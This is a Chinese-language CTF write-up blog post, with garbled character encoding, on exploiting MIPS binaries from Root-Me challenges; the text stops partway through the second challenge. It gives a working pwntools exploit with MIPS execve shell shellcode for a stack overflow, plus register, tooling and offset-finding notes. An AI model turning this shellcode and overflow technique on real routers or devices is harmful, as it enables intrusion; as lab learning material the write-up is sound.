<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="MIPS PWNå­¦ä¹ "><meta name="keywords" content="MIPS"><meta name="author" content="Lock,undefined"><meta name="copyright" content="Lock"><title>MIPS PWNå­¦ä¹ ã€Lock's blogã€‘</title><link rel="stylesheet" href="/LawlietLW.github.io/css/fan.css"><link rel="stylesheet" href="/LawlietLW.github.io/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/LawlietLW.github.io/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/LawlietLW.github.io/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('è¯·è¾“å…¥æ–‡ç« å¯†ç ') !== '') {
        alert('å¯†ç é”™è¯¯ï¼');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/LawlietLW.github.io/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  }
}</script><meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="Lock's blog" type="application/atom+xml">
<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="æ–‡ç« ç›®å½•">ç«™ç‚¹æ¦‚è§ˆ</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">ç›®å½•</div><div class="sidebar-toc-progress"><span class="progress-notice">æ‚¨å·²é˜…è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><span class="toc-number">1.</span> <span class="toc-text">0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-rootme-ELF-MIPS-Basic-ROP"><span class="toc-number">2.</span> <span class="toc-text">0x2.rootme-ELF MIPS - Basic ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-xmctf-top-mipspwn"><span class="toc-number">3.</span> <span class="toc-text">0x3.xmctf.top-mipspwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">Lock</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="mailto:2499086884@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/LawlietLW.github.io/archives"><span class="pull-top">æ—¥å¿—</span><span class="pull-bottom">32</span></a><a class="author-info-articles-tags article-meta" href="/LawlietLW.github.io/tags"><span class="pull-top">æ ‡ç­¾</span><span class="pull-bottom">40</span></a><a class="author-info-articles-categories article-meta" href="/LawlietLW.github.io/categories"><span class="pull-top">åˆ†ç±»</span><span class="pull-bottom">5</span></a></div><div class="friend-link"><a class="friend-link-text" href="https://buuoj.cn/" target="_blank">å‹é“¾1:BUUCTFï¼Œæœ‰åˆ·ä¸å®Œçš„é¢˜~</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">é¦–é¡µ</a><a class="menu-item" href="/tags">æ ‡ç­¾</a><a class="menu-item" href="/categories">åˆ†ç±»</a><a class="menu-item" href="/archives">å½’æ¡£</a><a class="menu-item" href="/about">å…³äº</a></nav><div class="right-info"><a class="title-name" href="/LawlietLW.github.io/">Lock's blog</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">MIPS PWNå­¦ä¹ </div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> å‘è¡¨äº 2020-08-04 | æ›´æ–°äº 2020-08-31</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">äºŒè¿›åˆ¶</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MIPS/">MIPS</a></div></div></div><div class="main-content"><p>â€‹        MIPSæ¶æ„å¸¸ç”¨äºè·¯ç”±å™¨è®¾å¤‡ï¼Œè€Œè·¯ç”±å™¨å›ºä»¶æ¼æ´å¤§éƒ¨åˆ†éƒ½æ˜¯æ ˆæº¢å‡ºï¼Œå› æ­¤ï¼ŒæŒæ¡MIPSæ¶æ„ä¸‹çš„æ¼æ´åˆ©ç”¨å¯¹äºæŒ–æ˜åˆ©ç”¨è·¯ç”±å™¨æ¼æ´ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€é¡¹æŠ€èƒ½ã€‚</p>
<a id="more"></a>

<p>å‡†å¤‡ç¯å¢ƒåŠå·¥å…·ï¼š</p>
<ul>
<li><strong>Ubuntu16</strong>è™šæ‹Ÿæœº(Ubuntu14æˆ–è€…Ubuntu18ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡æ¨èä½¿ç”¨Ubuntu16ï¼Œæˆ‘ç”¨18è£…ç¯å¢ƒé‡åˆ°äº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜)</li>
<li><strong>buildroot</strong>äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼Œç”±äº<strong>buildroot</strong>åªèƒ½ç¼–è¯‘å¤§ç«¯åºæˆ–è€…å°ç«¯åºä¸€ç§æ¶æ„çš„ç¯å¢ƒï¼Œè¿™é‡Œæ¨èå®‰è£…<strong>gcc-mipsel-linux-gnu</strong>å’Œ<strong>gcc-mips-linux-gnu</strong>ï¼Œç›´æ¥aptå®‰è£…å°±å¯ä»¥ï¼Œä½¿ç”¨æ–¹æ³•å’Œgccä¸€æ ·</li>
<li><strong>gdb-multiarch</strong>ï¼Œæä¾›å¤šæ¶æ„çš„è°ƒè¯•ï¼Œç›´æ¥aptå®‰è£…ï¼Œå†è£…ä¸€ä¸ª<strong>pwndbg</strong>æˆ–è€…<strong>peda</strong>æˆ–è€…<strong>gef</strong>æ’ä»¶ä½¿ç”¨æ›´æ–¹ä¾¿ï¼Œä½¿ç”¨æ–¹æ³•ï¼š<strong>qemu-mips/qemu-mipsel -L lib/ -g 1234(ç«¯å£å·) ./bin</strong> ,ç„¶å<strong>gdb-multiarch ./bin</strong>åŠ è½½ç¨‹åºï¼Œgdbä¼šè‡ªåŠ¨è¯†åˆ«ç¨‹åºæ¶æ„ï¼Œç„¶åç”¨<strong>target remote:127.0.0.1:1234</strong>æ¥è¿æ¥qemuè¿›è¡Œè°ƒè¯•å³å¯ã€‚å½“ç„¶ï¼Œç”¨IDAè¿æ¥ä¹Ÿæ˜¯å¯ä»¥ï¼Œ<strong>Debugger-&gt;Remote GDB Debugger</strong>ç„¶åå¡«ä¸Šipç«¯å£å·å’Œæ–‡ä»¶è·¯å¾„å°±è¡Œäº†</li>
<li>IDAæ’ä»¶ï¼Œ<strong>mipsrop</strong>ï¼Œå¼€æºåœ¨GitHubä¸Šï¼Œç”±äºmipsæŒ‡ä»¤å’Œx86æŒ‡ä»¤å­˜åœ¨å·®åˆ«ï¼ŒmipsæŒ‡ä»¤æ²¡æœ‰ç±»ä¼¼äºpushã€popè¿™ç§ç›´æ¥ä½¿æ•°æ®å…¥æ ˆå‡ºæ ˆçš„æŒ‡ä»¤ï¼Œåªæœ‰<strong>lw(load word)</strong>ï¼Œ<strong>sw(save word)</strong>ä¹‹ç±»çš„æŒ‡ä»¤æ¥è¿›è¡Œæ•°æ®çš„è½¬ç§»ï¼Œäºæ˜¯æˆ‘ä»¬è¦åœ¨æ ˆä¸Šè¿›è¡Œæ“ä½œå°±æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œç”¨<strong>ROPgadget</strong>æ¥æœç´¢ä¼šå¾ˆéº»çƒ¦ï¼Œè€Œ<strong>mipsrop</strong>ä¼šå°†<strong>gadgets</strong>è¿›è¡Œåˆ†ç±»ä»¥åŠä¸åŒçš„<strong>gadget</strong>ä½¿ç”¨åå¯¼è‡´çš„ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œä½¿ç”¨èµ·æ¥è¦æ–¹ä¾¿çš„å¤šã€‚</li>
<li><strong>Ghidra</strong>ï¼Œå°†mipsæ±‡ç¼–åç¼–è¯‘ä¸ºcä¼ªä»£ç ï¼Œ<strong>jeb</strong>ä¹Ÿæœ‰mipsåç¼–è¯‘åŠŸèƒ½ï¼Œä¸è¿‡å¯¹æ¯”äº†ä¸€ä¸‹è§‰å¾—<strong>Ghidra</strong>çš„æ•ˆæœæ›´å¥½(IDA7.5ä¹Ÿæ–°å¢äº†mipsåç¼–è¯‘åŠŸèƒ½ï¼Œä¸è¿‡â€¦â€¦è´«ç©·ä½¿æˆ‘æœ›è€Œå´æ­¥)</li>
</ul>
<p>â€‹       ç®€å•è¯´ä¸€ä¸‹mipsæ¶æ„çš„å¯„å­˜å™¨åŠä½œç”¨ã€‚mips32ä¸€å…±æœ‰32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œç”¨<strong>$0-$31</strong>è¡¨ç¤ºã€‚<strong>$4-$7</strong>å¯„å­˜å™¨ç”¨ä½œå‡½æ•°ä¼ å‚ï¼Œè®°ä¸º<strong>$a0-$a3(argument)</strong>,è¶…å‡ºå››ä¸ªå‚æ•°çš„ç”¨æ ˆä¼ å‚;<strong>$28</strong>å¯„å­˜å™¨è®°ä¸º<strong>$gp(global pointer)</strong>,è¿™æ˜¯ä¸€ä¸ªå…¨å±€æŒ‡é’ˆï¼Œå„ç§å‡½æ•°è°ƒç”¨ä¹‹ç±»éƒ½é $gpå¯»å€;<strong>$29</strong>è®°ä¸º<strong>$sp(stack pointer)</strong>,ä½œç”¨å’Œx86æ¶æ„çš„spå¯„å­˜å™¨ä¸€æ ·ï¼ŒæŒ‡å‘æ ˆé¡¶;<strong>$30</strong>è®°ä¸º<strong>$fp(fram pointer)</strong>,æˆ–è€…è®°ä¸º<strong>$s8</strong>ï¼Œè¿™ä¸ªå¯„å­˜å™¨ç±»ä¼¼äºx86æ¶æ„çš„ebpæŒ‡é’ˆï¼ŒæŒ‡å‘æ ˆåº•;<strong>$31</strong>è®°ä¸º<strong>$ra(return address)</strong>ï¼Œç±»ä¼¼äºx86æ¶æ„çš„eipå¯„å­˜å™¨ï¼Œä¿å­˜è¿”å›åœ°å€ï¼Œæˆ‘ä»¬çš„æ”»å‡»ç›®æ ‡å°±æ˜¯åŠ«æŒ$raå¯„å­˜å™¨ã€‚æˆ‘ä»¬è¿›è¡Œåˆ©ç”¨å¸¸ç”¨çš„å°±è¿™äº›å¯„å­˜å™¨ã€‚</p>
<p>æ¥ä¸‹æ¥ä¸Šé¢˜</p>
<h2 id="0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><a href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX" class="headerlink" title="0x1.rootme-ELF MIPS - Stack buffer overflow - No NX"></a>0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</h2><p>é¢˜ç›®åªç»™æˆ‘ä»¬mipsçš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”±æ±‡ç¼–ç¼–è¯‘å‡ºå¯æ‰§è¡Œæ–‡ä»¶</p>
<pre class=" language-assembly"><code class="language-assembly">.set    nomips16
    .global __start
    .text

__start:
    la      $t9, function
    jalr    $t9
    nop
    addiu   $v0, $zero, 4000 + 1
    move    $a0, $zero
    syscall
function:
    subu    $sp, $sp, 0x18
    sw      $ra, 0x14($sp)

    # write
    addiu   $v0, $zero, 4000 + 4
    la    $a0, 1
    la    $a1, hello
    la    $a2, hello_len
    syscall

    # read
    addiu   $v0, $zero, 4000 + 3
    move    $a0, $zero
    move    $a1, $sp
    addiu   $a2, $zero, 0x80
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    la      $a1, hello_start
    la      $a2, hello_start_len
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    move    $a1, $sp
    la      $a2, 20
    syscall

    lw      $ra, 0x14($sp)
    addiu   $sp, 0x18
    jr      $ra
    nop

.data

hello:  .asciz  "Hello World\nWhat is your name: "
    hello_len =    . - hello
hello_start:  .asciz  "Hello "
    hello_start_len =    . - hello_start</code></pre>
<p>é¢˜ç›®ç»™çš„ä¿æŠ¤å¦‚ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt></p>
<p>ç”±äºé¢˜ç›®è¯´çš„æ˜¯MIPSï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æŒ‰ç…§å¤§ç«¯åºæ¥ç¼–è¯‘</p>
<p>ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘</p>
<pre><code>mips-linux-gnu-as of.s -o of.o #ç¼–è¯‘æˆäºŒè¿›åˆ¶ç›®æ ‡æ–‡ä»¶
mips-linux-gnu-ld of.o -o of #ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</code></pre><p>ç„¶åæˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼Œç”±äºæ˜¯é™æ€ç¼–è¯‘ï¼Œæ‰€ä»¥ç›´æ¥./ofå³å¯</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt></p>
<p>ä»æ±‡ç¼–æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p>
<pre class=" language-assembly"><code class="language-assembly">subu    $sp, $sp, 0x18
sw      $ra, 0x14($sp)</code></pre>
<p>å‡½æ•°å¼€å¤´åªå°†æ ˆé¡¶æŠ¬é«˜äº†0x18ä¸ªå­—èŠ‚ï¼Œå¹¶å°†è¿”å›åœ°å€å­˜å…¥sp+0x14çš„ä½ç½®ï¼Œè€Œåé¢çš„readåŠŸèƒ½è¯»å…¥0x80ä¸ªå­—èŠ‚</p>
<pre class=" language-assembly"><code class="language-assembly"># read
addiu   $v0, $zero, 4000 + 3 #$v0ä¿å­˜ç³»ç»Ÿè°ƒç”¨å·ï¼Œreadç³»ç»Ÿè°ƒç”¨å·ä¸º4003
move    $a0, $zero #$a0ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ0
move    $a1, $sp #$a1ä¿å­˜ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ ˆé¡¶æŒ‡é’ˆ
addiu   $a2, $zero, 0x80 #$a2ä¿å­˜ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ0x80</code></pre>
<p>å­˜åœ¨å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œè€Œç”±äºç¨‹åºæ˜¯ç”±ç®€çŸ­çš„æ±‡ç¼–ä»£ç ç”Ÿæˆï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šä¸å­˜åœ¨å¯ç”¨çš„gadgetï¼Œè€Œç”±äºè¿œç¨‹æ²¡æœ‰å¼€å¯<strong>ASLR</strong>ï¼Œæ‰€ä»¥æ ˆåœ°å€ä¹Ÿä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¸”ç¨‹åºæ²¡æœ‰<strong>NX</strong>ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨shellcodeæ¥è¿›è¡Œåˆ©ç”¨</p>
<p>ç”±æ±‡ç¼–ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“offsetä¸º0x14ï¼Œæˆ‘ä»¬å¡«å……0x14ä¸ªåƒåœ¾å­—ç¬¦ï¼Œç„¶åå°†è¿”å›å€¼è¦†ç›–ä¸º<strong>$sp+0x14+4</strong>ï¼Œå³å­˜å‚¨è¿”å›åœ°å€çš„ä½ç½®çš„åå››å­—èŠ‚ï¼Œç„¶åå°†$sp+0x14+4çš„å€¼å¡«å……ä¸ºshellcodeï¼Œè¿™æ ·è¿”å›åˆ°$raä¹‹åå°±ä¼šæ‰§è¡Œshellcode</p>
<p>å…³é—­æœ¬æœºä¸Šçš„aslrååŠ¨æ€è°ƒè¯•ï¼Œå¯ä»¥å¾—åˆ°stackçš„åœ°å€</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt></p>
<p>ä¸è¿‡åœ¨æŒ‰ç…§è¿™ä¸ªæ ˆåœ°å€æ‰“ä¸é€šï¼Œäºæ˜¯æˆ‘åŠ¨è°ƒäº†ä¸€ä¸‹expï¼Œå‘ç°æ­¤æ—¶çš„æ ˆåœ°å€åä¸‰ä½ä¸º148ï¼Œè°ƒè¯•ç¨‹åºå’Œè°ƒè¯•expæ—¶çš„æ ˆåœ°å€ç›¸å·®0x10çš„å¤§å°</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt></p>
<p>ä¿®æ”¹ä¹‹åä¾¿èƒ½æ‰“é€šäº†,æœ€ç»ˆexpå¦‚ä¸‹</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>
<span class="token comment" spellcheck="true"># io=process(['qemu-mips','-g','1235','./of'])</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./of'</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token number">0x76fff148</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
payload <span class="token operator">+=</span> shellcode
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is your name: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt></p>
<p>(ä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿œç¨‹å°±æ˜¯æ‰“ä¸é€šã€‚ã€‚ã€‚)</p>
<h2 id="0x2-rootme-ELF-MIPS-Basic-ROP"><a href="#0x2-rootme-ELF-MIPS-Basic-ROP" class="headerlink" title="0x2.rootme-ELF MIPS - Basic ROP"></a>0x2.rootme-ELF MIPS - Basic ROP</h2><p>ç¨‹åºä¿æŠ¤å¦‚ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt></p>
<p>è¿æ¥sshä¸‹è½½æ–‡ä»¶</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt>)(rootmeçš„sshè¿ä¸Šå»è¿˜æŒºå¥½åº·çš„)</p>
<p>è™½ç„¶é¢˜ç›®å·²ç»å‘Šè¯‰äº†ä¿æŠ¤æƒ…å†µï¼Œä½†æ‹¿åˆ°é¢˜ç›®æˆ‘è¿˜æ˜¯ä¹ æƒ¯å…ˆchecksecä¸€ä¸‹</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt></p>
<p>32ä½å¤§ç«¯åºç¨‹åºï¼Œè€Œä¸”ä¹‹å‰sshè¿ä¸Šå»ä¹‹åå°±ç›´æ¥å‘Šè¯‰æˆ‘ä»¬äº†ç¨‹åºæ˜¯åŠ¨æ€ç¼–è¯‘çš„</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt></p>
<p>äºæ˜¯æˆ‘ä»¬é¡ºä¾¿æŠŠlibæ–‡ä»¶å¤¹ä¸‹è½½ä¸‹æ¥(ç”±äºsshæœåŠ¡å™¨åœ¨å¤–ç½‘ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¸‹è½½çš„æŒºæ…¢çš„ã€‚ã€‚ã€‚)ï¼Œæ–‡ä»¶å¤¹ä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œld.so.1å’Œlibc.so.6</p>
<p>ä½†è¿è¡Œèµ·æ¥å´å‡ºäº†æ„æƒ³ä¸åˆ°çš„æƒ…å†µ</p>
<p>ä¸€èˆ¬æ¥è¯´åº”è¯¥ç›´æ¥<strong>qemu-mips -L  ./  ./ch64</strong>å°±èƒ½è¿è¡Œèµ·æ¥ï¼Œä½†è¿™é¢˜å´ç»™æˆ‘æŠ¥äº†è¿™ä¹ˆä¸ªé”™</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt></p>
<p>ç„¶è€Œåœ¨sshæœåŠ¡å™¨ä¸Šä½¿ç”¨è¿™æ¡å‘½ä»¤å´èƒ½ç›´æ¥è¿è¡Œ</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt></p>
<p>æœ‰ç‚¹æ‡µé€¼ï¼Œé‚è°·æ­ŒæŠ¥é”™ä¿¡æ¯ï¼Œä½†å¹¶æ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹sshæœåŠ¡å™¨ä¸Šçš„qemuç‰ˆæœ¬ï¼Œä¸º2.11.1ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯qemuç‰ˆæœ¬ä¸å¯¹ï¼Œå°±ä¸‹è½½äº†2.11.1ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆğŸ¥šç”¨ï¼Œé™·å…¥æ²‰æ€ã€‚ä¹‹ååˆè°·æ­Œäº†ä¸€ä¸‹ï¼Œçœ‹åˆ°æœ‰ç±»ä¼¼æŠ¥é”™çš„ï¼Œç›´æ¥ä½¿ç”¨-gè¿›è¡Œè°ƒè¯•ï¼Œäºæ˜¯ä½¿ç”¨<strong>qemu-mips -L  ./ -g 1234 ./ch64</strong>å¯åŠ¨è°ƒè¯•ï¼ŒvmmapæŸ¥çœ‹å‘ç°ç¨‹åºå¹¶æœªåŠ è½½libc.6.soåº“,ä»…ä»…åªåŠ è½½äº†ld.so.1ï¼Œäºæ˜¯ä¾¿ä½¿ç”¨pwné¢˜ä¸‹åŠ è½½ä¸åŒlibcçš„æ–¹æ³•å¼ºåˆ¶åŠ è½½libc.so.6åº“</p>
<pre class=" language-shell"><code class="language-shell">export LD_LIBRARY_PATH=`pwd`
export LD_PRELOAD=lib/libc.so.6</code></pre>
<p>ç„¶åè¿è¡Œ</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt></p>
<p>æˆåŠŸï¼ç¬¬ä¸€è¡Œçš„æŠ¥é”™ä¸ªäººçŒœæµ‹æ˜¯æˆ‘å¼ºåˆ¶åŠ è½½äº†libcåº“ï¼Œç„¶å-L åˆæŒ‡å®šäº†ä¸€ä¸‹libcï¼Œç„¶åæŠ¥é”™ï¼Œå½“ç„¶è¿™åªæ˜¯çŒœæµ‹ï¼Œä¹Ÿæ‡’å¾—è°·æ­Œäº†</p>
<p>æ¥ä¸‹æ¥å°±å¼€å§‹åˆ©ç”¨</p>
<p>é¦–å…ˆå°†ç¨‹åºåˆ†åˆ«ç”¨IDAå’ŒGhidraè¿›è¡ŒåŠ è½½ï¼Œç”¨ghidraæŸ¥çœ‹ä¼ªä»£ç ,mainå‡½æ•°å¦‚ä¸‹</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  byte bStack144<span class="token punctuation">;</span>
  <span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  bStack144 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_stdout<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token string">"$MyPasswordPoorlySecured!"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    bStack144 <span class="token operator">=</span> bStack144 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess granted!.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>åˆ†æmainå‡½æ•°ï¼Œæˆ‘ä»¬æœ‰ä¸‰æ¬¡è¾“å…¥çš„æœºä¼šï¼Œå­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡º</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>fgetsæ¥å—0x200ä¸ªå­—èŠ‚çš„è¾“å…¥ï¼Œè€Œç¼“å†²åŒºå¤§å°åªæœ‰128å­—èŠ‚ï¼Œå½“è¾“å…¥ä¸º<strong>$MyPasswordPoorlySecured!</strong>æ—¶å°±é€€å‡ºwhileå¾ªç¯</p>
<p>æˆ‘ä»¬åŠ¨æ€è°ƒè¯•ä¸€ä¸‹æ¥ç¡®å®šåç§»é‡ï¼Œä½¿ç”¨cyclic 200ç”Ÿæˆ200ä¸ªå­—ç¬¦ï¼Œç„¶åè¾“å…¥è¿›å»</p>
